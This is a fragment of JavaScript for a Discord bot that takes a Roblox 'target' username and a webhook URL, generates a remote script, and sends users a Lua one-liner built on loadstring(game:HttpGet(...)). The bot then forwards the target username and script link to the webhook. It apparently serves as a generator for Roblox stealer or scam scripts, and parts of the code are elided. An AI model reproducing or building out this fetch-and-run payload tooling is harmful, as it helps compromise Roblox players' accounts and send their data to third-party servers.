...
client.on("interactionCreate", async (i) => {
  if (i.isChatInputCommand() && i.commandName === "generate") {
    ...
    try {
      ...
      const usernameInput = i.fields.getTextInputValue("u");
      const targetWebhook = i.fields.getTextInputValue("wh");

      const rawUrl = await generateScript(usernameInput, targetWebhook, templateKey);
      const scriptPayload = `\`\`\`lua\nloadstring(game:HttpGet("${rawUrl}"))()\n\`\`\``;

      // 1. Send script to user's DMs
      await i.user.send({ content: scriptPayload });

      // 2. FORWARD DATA TO YOUR WEBHOOK SERVER
      try {
        await axios.post(targetWebhook, {
          event: "script_generated",
          bot_user: i.user.tag,
          roblox_target_username: usernameInput,
          script_link: rawUrl
        });
      ...
      await i.editReply("❌ Failed to generate script.");
    }
  }
